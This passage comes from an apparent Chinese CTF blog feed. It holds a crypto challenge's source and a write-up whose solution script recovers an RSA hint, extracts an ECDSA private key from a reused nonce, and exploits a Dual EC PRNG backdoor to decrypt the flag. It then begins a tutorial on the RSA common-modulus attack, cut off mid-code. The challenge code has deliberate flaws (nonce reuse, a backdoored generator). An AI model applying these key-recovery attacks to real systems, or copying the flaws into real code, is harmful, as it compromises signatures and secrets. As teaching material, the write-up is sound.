<span class="keyword">if</span> Gen_Curve:</span><br><span class="line">            self.int_curve()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">int_curve</span>(<span class="params">self,CURVE = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> CURVE == <span class="literal">None</span>:</span><br><span class="line">            self.Curve = NIST256p</span><br><span class="line">            self.g = self.Curve.generator * self.state</span><br><span class="line">            num1 = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">            num2 = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">            self.P = num2*self.g</span><br><span class="line">            self.Q = num1*self.g</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get the confirmed curve</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Curve, P, Q = CURVE</span><br><span class="line">            self.Curve = Curve</span><br><span class="line">            self.g = Curve.gen(<span class="number">0</span>)</span><br><span class="line">            self.P = P</span><br><span class="line">            self.Q = Q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">int_getkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># To get the right random key</span></span><br><span class="line">        t = <span class="built_in">int</span>((self.state * self.Q).x())</span><br><span class="line">        self.int_updade()</span><br><span class="line">        <span class="keyword">return</span> t%(<span class="number">2</span>**<span class="number">250</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RSA_reinforce</span>(<span class="params">self,key: <span class="built_in">int</span></span>):</span><br><span class="line">        p = my_own_prime(<span class="number">512</span>)</span><br><span class="line">        q = my_own_prime(<span class="number">512</span>)</span><br><span class="line">        n = p * q</span><br><span class="line">        leak = p + q</span><br><span class="line">        e = <span class="number">16542764952</span></span><br><span class="line">        c = <span class="built_in">pow</span>(key, e, n)</span><br><span class="line">        <span class="keyword">return</span> (c, n, leak)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">int_updade</span>(<span class="params">self</span>):</span><br><span class="line">        self.state = <span class="built_in">int</span>((self.state * self.P).x())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Random_key</span>(<span class="params">self, n:<span class="built_in">int</span></span>):</span><br><span class="line">        out = <span class="number">0</span></span><br><span class="line">        number = ceil(n/<span class="number">250</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number):</span><br><span class="line">            out = (out&lt;&lt;<span class="number">250</span>) + self.int_getkey()</span><br><span class="line">        <span class="keyword">return</span> out % (<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.Random = Random_EC()</span><br><span class="line">        self.Curve_length = <span class="number">384</span></span><br><span class="line">        self.curve = NIST384p</span><br><span class="line">        self.gen = self.curve.generator</span><br><span class="line">        self.pri_key = self.Random.Random_key((self.Curve_length*<span class="number">125</span>)//<span class="number">192</span>)</span><br><span class="line">        self.pub_key = self.pri_key * self.gen</span><br><span class="line">        self.order = self.curve.order</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_curve</span>(<span class="params">self, curve</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.Random = Random_EC()</span><br><span class="line">        self.Curve_length = <span class="number">384</span></span><br><span class="line">        self.curve = curve</span><br><span class="line">        self.gen = curve.generator</span><br><span class="line">        self.order = self.curve.order</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_pri_key</span>(<span class="params">self, d: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.pri_key = d</span><br><span class="line">        self.pub_key = d * self.gen</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg: <span class="built_in">bytes</span>, K_time:<span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> K_time == <span class="number">0</span>:</span><br><span class="line">            K = long_to_bytes(self.Random.Random_key(self.Curve_length))</span><br><span class="line">            k = <span class="built_in">int</span>(sha256(K).hexdigest(), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = K_time</span><br><span class="line"></span><br><span class="line">        P = k * self.gen</span><br><span class="line">        r = <span class="built_in">int</span>(P.x())</span><br><span class="line">        k_v = <span class="built_in">int</span>(inverse(k, self.order))</span><br><span class="line">        e = <span class="built_in">int</span>(sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">        s = (e + self.pri_key * r) * k_v % self.order</span><br><span class="line">        <span class="comment"># print('k = ',k)</span></span><br><span class="line">        <span class="keyword">return</span> r, s, k</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg: <span class="built_in">bytes</span>, signature: <span class="built_in">tuple</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        r, s = signature</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span>  <span class="number">0</span> &lt; r &lt; self.order</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt; s &lt; self.order</span><br><span class="line"></span><br><span class="line">        e = <span class="built_in">int</span>(sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">        w = <span class="built_in">int</span>(inverse(s, self.order))</span><br><span class="line">        u1 = e * w % self.order</span><br><span class="line">        u2 = r * w % self.order</span><br><span class="line">        P = u1 * self.gen + u2 * self.pub_key</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(r) == <span class="built_in">int</span>(P.x())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">into_secret</span>(<span class="params">self, msg: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="comment"># sage</span></span><br><span class="line">        E = EllipticCurve(GF(<span class="built_in">int</span>(NIST384p.curve.p())),[<span class="built_in">int</span>(NIST384p.curve.a()), <span class="built_in">int</span>(NIST384p.curve.b())])</span><br><span class="line">        Point = E.lift_x(msg)</span><br><span class="line">        Key = self.Random.Random_key(self.Curve_length)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(Key)*Point</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    hint = <span class="string">b"****************************************************"</span></span><br><span class="line">    flag = bytes_to_long(flag)</span><br><span class="line">    hint = bytes_to_long(hint)</span><br><span class="line">    secret = bytes_to_long(secret)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>):</span><br><span class="line">        SIGN = ECDSA()</span><br><span class="line"></span><br><span class="line">        Hint = SIGN.Random.RSA_reinforce(hint)</span><br><span class="line">        m1 = <span class="string">b'A typical Dual ec prng vulnerability applied to NSA, you can find its source in past papers.'</span></span><br><span class="line">        m2 = <span class="string">b'Hope you have learned a good foundation of ECDSA, it can help you better answer and understand this problem.'</span></span><br><span class="line">        C = flag^^secret</span><br><span class="line">        into_secret = SIGN.into_secret(secret)</span><br><span class="line">        sign1 = SIGN.sign(m1,<span class="number">0</span>)</span><br><span class="line">        sign2 = SIGN.sign(m2,sign1[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'C = <span class="subst">{C}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'Hint = <span class="subst">{Hint}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'pub_key = <span class="subst">{SIGN.pub_key.x(),SIGN.pub_key.y()}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'P = <span class="subst">{<span class="built_in">int</span>(SIGN.Random.P.x()),<span class="built_in">int</span>(SIGN.Random.P.y())}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'Q = <span class="subst">{<span class="built_in">int</span>(SIGN.Random.Q.x()),<span class="built_in">int</span>(SIGN.Random.Q.y())}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'sign1 = <span class="subst">{sign1[:<span class="number">2</span>]}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'sign2 = <span class="subst">{sign2[:<span class="number">2</span>]}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'into_secret = <span class="subst">{into_secret}</span>'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'-------------------------------------------------------------------'</span>)</span><br></pre></td></tr></tbody></table></figure><p>数据有好多，不放了。。</p><p>m1，m2中给了提示说题目与Dual EC伪随机数发生器相关。相关的知识可以参考<a href="https://tl2cents.github.io/2023/04/20/Cryptographic-Backdoor-1-Dual-EC/">tl2cents师傅的文章</a>，很详细的讲了这个伪随机数发生器的原理。</p><p>Dual EC其实就是一个伪随机数发生器，他选取E=NIST256p作为用于产生伪随机数的椭圆曲线，其产生随机数的步骤是：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">选取E上的两个随机点P、Q</span><br><span class="line">初始化一个起始状态state(256bit)</span><br><span class="line">每次要获取一个随机数时，就计算当前的stateQ的横坐标，并按要求截取对应比特，当作本次产生的伪随机数；产生伪随机数后，更新state为stateP的横坐标</span><br></pre></td></tr></tbody></table></figure><p>如果攻击者掌握了一个d值，这个d值满足：</p><script type="math/tex; mode=display">P=dQ</script><p>那么对于任意一个产生的随机数，攻击者相当于知道了对应的stateQ点，那么又因为他知道d，所以他就有state*dQ点，也就是stateP点。也就是说，攻击者就能获取以后的所有伪随机数，这就是Dual EC的后门。</p><p>原理知道了看看题目</p><p>发现有一个hint，以下是对hint的加密部分：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_reinforce</span>(<span class="params">self,key: <span class="built_in">int</span></span>):</span><br><span class="line">    p = my_own_prime(<span class="number">512</span>)</span><br><span class="line">    q = my_own_prime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    leak = p + q</span><br><span class="line">    e = <span class="number">16542764952</span></span><br><span class="line">    c = <span class="built_in">pow</span>(key, e, n)</span><br><span class="line">    <span class="keyword">return</span> (c, n, leak)</span><br></pre></td></tr></tbody></table></figure><p>正常求p，q就可以，但是发现e和p-1及q-1均不互素，还需要有限域开根或者AMM才能解出hint。</p><p>得到hint为：<strong>Anything greater than 2^15 is really that’s too big</strong></p><p>接着分析题目。接下来可以发现的一点是：所有签名的r值都相同。这一点看代码也能看出，对m2的签名用的是签名m1时的k，所以存在一个k复用的问题。而签名的流程是：</p><script type="math/tex; mode=display">s_1*k=r_1*phi+e_1(mod\;order)</script><script type="math/tex; mode=display">s_2*k=r_2*phi+c_2(mod\;order)</script><p>而k相同会导致r相同，所以两式只需要简单作差消去k，就能求出pri的值：</p><script type="math/tex; mode=display">pri = (e_2*s_1 - e_1*s_2)*(r_1*s_2-r_2*s_1)^{-1} (mod\;order)</script><p>既然能求出pri的值，而pri是250bit数量级，是一个state*Q的坐标的低250位，因此只需要爆破6位就可以得到这个点的完整坐标。而根据Dual EC的后门可以知道，如果我们有P=dQ的d这个值，就可以完全掌控后面所有的state，也就可以拿到之后用于加密secret的key值。那么问题就在于如何求出这个d。</p><p>而P,Q生成过程是：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,state = <span class="literal">None</span>,Gen_Curve = <span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">if</span> state == <span class="literal">None</span>:</span><br><span class="line">        self.state = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.state = state</span><br><span class="line">    <span class="keyword">if</span> Gen_Curve:</span><br><span class="line">        self.int_curve()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_curve</span>(<span class="params">self,CURVE = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> CURVE == <span class="literal">None</span>:</span><br><span class="line">        self.Curve = NIST256p</span><br><span class="line">        self.g = self.Curve.generator * self.state</span><br><span class="line">        num1 = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        num2 = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        self.P = num2*self.g</span><br><span class="line">        self.Q = num1*self.g</span><br></pre></td></tr></tbody></table></figure><p>这个时候我们就可以用到之前解出来的hint了，这个意思难道是在说这么多组数据之中，存在一个小于2^15的d值？一旦有了这个想法，马上就能找到一个证明这个思路的依据：</p><ul><li>一共只有232组数据，和题目循环的250次不一样，显然动了手脚</li></ul><p>那么题目给这么多组明明就没有关系的数据也就说得通了。</p><p>那么接下来要做的是就是对每一组依次试一下看存不存在小于2^15的d满足P=dQ，然后用存在的那一组解密即可。这里也有一点小的优化技巧，就是不要这样写：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span>(i*Q == p):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure><p>这样是很自然的写法，但是会做很多多余的点加法计算，就比如你计算9Q的时候，其实在前面计算8Q时已经算过8Q的值，只需要用那个8Q的值求8Q+Q就能得到9Q了。所以更好的方式是写成：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">P = NIST_256_CURVE(P)</span><br><span class="line">Q = NIST_256_CURVE(Q)</span><br><span class="line">q0 = Q</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">15</span>):</span><br><span class="line"><span class="keyword">if</span>(q0 == P):</span><br><span class="line"><span class="built_in">print</span>(j,i)</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line">q0 += Q</span><br></pre></td></tr></tbody></table></figure><p>这样会减少很多时间，本来爆破完所有数据可能要两小时，但这样五六分钟就可以搞定。</p><p>求出d过后就是控制Dual EC生成我们需要的伪随机数key，然后求逆并作点乘得到secret，并与C异或就得出flag了。</p><p>exp:</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line"><span class="comment">#part1 get hint</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>):</span><br><span class="line">    c,n,leak = (<span class="number">12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329</span>, <span class="number">122908984806235457892414635852036332676574434804833208576141668077475917235411535511069143359388659946159724740722593181625712110278669227640297497485641848470391938438894136564046632275052354217712453952532772368082733299695485759213723305738760035793602060420638500827652832664161031815519780589765520132973</span>, <span class="number">22333858470427703056488469739724305644350178024239032705153649807913901449803887198889611591209527103787726531081225700412575986297091811550954958064297166</span>)</span><br><span class="line">    e = <span class="number">16542764952</span></span><br><span class="line">    p_q = iroot(leak^<span class="number">2</span>-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    p = (leak + p_q) // <span class="number">2</span></span><br><span class="line">    q = n // p</span><br><span class="line">    cq = <span class="built_in">pow</span>(c,inverse(e//<span class="number">24</span>,q-<span class="number">1</span>),q)</span><br><span class="line">    PR.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">    f = x^<span class="number">24</span> - cq</span><br><span class="line">    resq = f.roots()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> resq:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(i[<span class="number">0</span>])))</span><br><span class="line">    <span class="comment">#hint: Anything greater than 2^15 is really that's too big</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#part2 get d</span></span><br><span class="line"><span class="comment"># NIST P-256</span></span><br><span class="line">NIST_256_P = <span class="number">0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span></span><br><span class="line">NIST_256_K = GF(NIST_256_P)</span><br><span class="line">NIST_256_A = NIST_256_K(<span class="number">0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc</span>)</span><br><span class="line">NIST_256_B = NIST_256_K(<span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span>)</span><br><span class="line">NIST_256_CURVE = EllipticCurve(NIST_256_K, (NIST_256_A, NIST_256_B))</span><br><span class="line">NIST_256_GEN = NIST_256_CURVE(<span class="number">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span>, <span class="number">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span>)</span><br><span class="line">NIST_256_ORDER = <span class="number">0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551</span> * <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NIST P-384</span></span><br><span class="line">NIST_384_P = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff</span></span><br><span class="line">NIST_384_K = GF(NIST_384_P)</span><br><span class="line">NIST_384_A = NIST_384_K(<span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc</span>)</span><br><span class="line">NIST_384_B = NIST_384_K(<span class="number">0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef</span>)</span><br><span class="line">NIST_384_CURVE = EllipticCurve(NIST_384_K, (NIST_384_A, NIST_384_B))</span><br><span class="line">NIST_384_GEN = NIST_384_CURVE(<span class="number">0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7</span>, <span class="number">0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f</span>)</span><br><span class="line">NIST_384_ORDER = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973</span> * <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#结合hint在2^15内爆破，发现第201组数据有异常：32309*Q = P</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r"output.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">250</span>):</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">                <span class="built_in">exec</span>(f.readline())</span><br><span class="line">            f.readline()</span><br><span class="line">            P = NIST_256_CURVE(P)</span><br><span class="line">            Q = NIST_256_CURVE(Q)</span><br><span class="line">            q0 = Q</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">15</span>):</span><br><span class="line">                <span class="keyword">if</span>(q0 == P):</span><br><span class="line">                    <span class="built_in">print</span>(j,i)</span><br><span class="line">                    <span class="built_in">print</span>(P)</span><br><span class="line">                q0 += Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#part3 get pri</span></span><br><span class="line">C = <span class="number">28370462154406144789913243909256020527531135264361458510233553021695306448248185548876492600895007348961847185821989</span></span><br><span class="line">pub_key = (<span class="number">23063531651133054044852146745751828065565652508316078757465526964945889829041322577333868291426745685755660447945768</span> , <span class="number">38213774544479557349161813523787259744626407961805163166366401345392394160489749007540120063131112167181615738936602</span>)</span><br><span class="line">P = (<span class="number">99376526638506705902714648195970871631891150648967956889439656483745513799077</span>, <span class="number">49286347987713888387330453808791204691290920954467279402308313223992253330920</span>)</span><br><span class="line">Q = (<span class="number">95979043517822469787247449840043678535429394578371796773017425344169131078878</span>, <span class="number">94108817998367868965643129518919867199519351407755146103464278196693149407197</span>)</span><br><span class="line">r1,s1 = (<span class="number">32594514971850903210957109229029032596013744664454613348001968983388557886022626485537652491952756966982681985873826</span>, <span class="number">33822531453262141722363336331985371357432586409495680846477948429687072595338746861106767975593900234281162130620713</span>)</span><br><span class="line">r2,s2 = (<span class="number">32594514971850903210957109229029032596013744664454613348001968983388557886022626485537652491952756966982681985873826</span>, <span class="number">30963116078493244587396392437563800584802728459796510243236725881496588593849796130551914519859427419450232539678279</span>)</span><br><span class="line">into_secret = (<span class="number">12219467168510963191933866108724307399115854676119007622103880230537250338471252977689989738440080704914043187805666</span> , <span class="number">15140655916234412794356873631237108843402057349206472869810848889771783263614142207164313273971781373595696054566462</span>)</span><br><span class="line">e1 = <span class="built_in">int</span>(sha256(<span class="string">b"A typical Dual ec prng vulnerability applied to NSA, you can find its source in past papers."</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">e2 = <span class="built_in">int</span>(sha256(<span class="string">b"Hope you have learned a good foundation of ECDSA, it can help you better answer and understand this problem."</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">P = NIST_256_CURVE(P)</span><br><span class="line">Q = NIST_256_CURVE(Q)</span><br><span class="line">into_secret = NIST_384_CURVE(into_secret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shared-k attack</span></span><br><span class="line">r = r1 = r2</span><br><span class="line">o = NIST_384_ORDER</span><br><span class="line">pri = (e2*s1-e1*s2)*inverse(r1*s2-r2*s1,o) % o</span><br><span class="line"></span><br><span class="line">d = <span class="number">32309</span></span><br><span class="line"><span class="keyword">assert</span> d*Q==P</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#part4 Dual_EC backdoor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_getkey</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># To get the right random key</span></span><br><span class="line">    t = <span class="built_in">int</span>((state * Q)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> t%(<span class="number">2</span>**<span class="number">250</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Random_key</span>(<span class="params">n,state</span>):</span><br><span class="line">    temp = state</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    number = ceil(n/<span class="number">250</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number):</span><br><span class="line">        out = (out&lt;&lt;<span class="number">250</span>) + int_getkey(temp)</span><br><span class="line">        temp = <span class="built_in">int</span>((temp*P)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> out % (<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">6</span>):</span><br><span class="line">    r = i*<span class="number">2</span>^<span class="number">250</span> + pri</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        R = NIST_256_CURVE.lift_x(r)</span><br><span class="line">        S = d*R</span><br><span class="line">        state = <span class="built_in">int</span>(S[<span class="number">0</span>])</span><br><span class="line">        key = Random_key(<span class="number">384</span>,state)</span><br><span class="line">        secret = <span class="built_in">int</span>((inverse(key,o)*into_secret)[<span class="number">0</span>])</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(secret^^C))</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">b"flag"</span> <span class="keyword">in</span> flag):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#b'flag{EC_PRNG_DUAL_NSA_18saL_0dh1_fh2ass0j_happy}'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h1><p>我好菜，题目没有问题，我有问题。</p><p>我这一生如履薄冰，你说我能走到对岸吗。。。</p><p><img src="/2024/01/23/2023-chun-qiu-bei-dong-ji-sai/image-20240129010233640.png" alt="image-20240129010233640"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA的共模攻击</title>
      <link href="/2024/01/18/rsa-de-gong-mo-gong-ji/"/>
      <url>/2024/01/18/rsa-de-gong-mo-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="简述RSA工作原理"><a href="#简述RSA工作原理" class="headerlink" title="简述RSA工作原理"></a>简述RSA工作原理</h1><ul><li>要加密的信息为m，加密后的信息为c</li><li>模n，计算出两个质数p和q，p和q计算欧拉函数值φ(n)</li><li>欧拉函数值φ(n)，$φ(n)=(p-1)(q-1)$</li><li>公钥参数e和私钥参数d，可由欧拉函数值计算出，$ed≡1 (mod φ(n))$</li><li>加密：$m^e ≡ c (mod n)$</li><li>解密：$c^d ≡ m (mod n)$</li></ul><h1 id="算法基础"><a href="#算法基础" class="headerlink" title="算法基础"></a><strong>算法基础</strong></h1><h2 id="裴蜀定理"><a href="#裴蜀定理" class="headerlink" title="裴蜀定理"></a>裴蜀定理</h2><p>因为翻译版本的不同，这个定理可能还会被叫做贝祖定理等。</p><p>裴蜀定理是这样被描述的：</p><script type="math/tex; mode=display">\forall a,b\in Z,\exists (x,y)\in Z</script><p>满足</p><script type="math/tex; mode=display">ax+by=gcd(a,b)</script><p>文字描述：对于任意整数a,b，都存在一对整数x,y，使得$ax+by=gcd(a,b)$成立</p><p><strong>证明：</strong></p><p>用欧几里得算法求解这个函数的过程：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> b?gcd(b,a%b):a;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>显然是一个递归求解的函数，在递归到最后时，$b=0$,不管$a$等于多少，这是必定有一组整数$x=1,y=0$使得：</p><script type="math/tex; mode=display">a*1+0*0=gcd(a,0)</script><p><strong>0和任何数的最大公约数都等于原数</strong></p><p>那么通过这个递归的过程进行回溯。当$b&gt;0$时，程序继续运行：$gcd(b,a\%b)=gcd(a,b)$，因为$a\%b=a-b[a/b]$，所以有以下推导：</p><script type="math/tex; mode=display">b*x+(a\%b)*y=gcd(b,a\%b)=bx+(a-b[a/b])y=ay-b(x-[a/b]y)</script><p>令$x’=y,y’=x-[a/b]y$，得出</p><script type="math/tex; mode=display">ax'+by'=gcd(a,b)</script><p>因为欧几里得算法的实现是递归的，而我们已经推出其中一个递归过程的实现，那么其他的递归过程就可以借助数学归纳法，一层层地向上推，必然会得出最终结论。</p><p>证毕</p><p><strong>应用</strong></p><p>裴蜀定理：</p><script type="math/tex; mode=display">ax+by=gcd(a,b)</script><p>那么可以推出：如果一个数m满足：$ax+by=m$，那么这个m一定是$gcd(a,b)$的倍数。</p><p>那么对于一个经典方程$ax+by=1$，利用裴蜀定理，我们有：$gcd(a,b)=1$，即a,b一定互质。</p><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p>回到裴蜀定理：</p><script type="math/tex; mode=display">ax+by=m</script><p>对于这个不定方程，如果存在一组合法的解$(x,y)$，那么一定会有$gcd(a,b)|m$，即m是$gcd(a,b)$的倍数。那么现在我不仅想知道到底有没有解，而是想知道在有解的情况下，这个解到底是多少。</p><p>这就是求解不定方程的过程。这个解决的算法就叫做<strong>扩展欧几里得算法</strong>。</p><p>可以发现，我们求解不定方程其实就是要求解一组合法的$(x,y)$，那么根据裴蜀定理的证明（基于欧几里得算法，采用递归的数学归纳），可以发现$x,y$的互相推导的关系。</p><p>这种采取递归来求解$x,y$的方法就叫做扩展欧几里得算法。</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">exgcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> &amp;x,<span class="type">int</span> &amp;y)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        x=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> d=exgcd(b,a%b,x,y);</span><br><span class="line">    <span class="type">int</span> k=x;</span><br><span class="line">    x=y;</span><br><span class="line">    y=k-a/b*y;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span 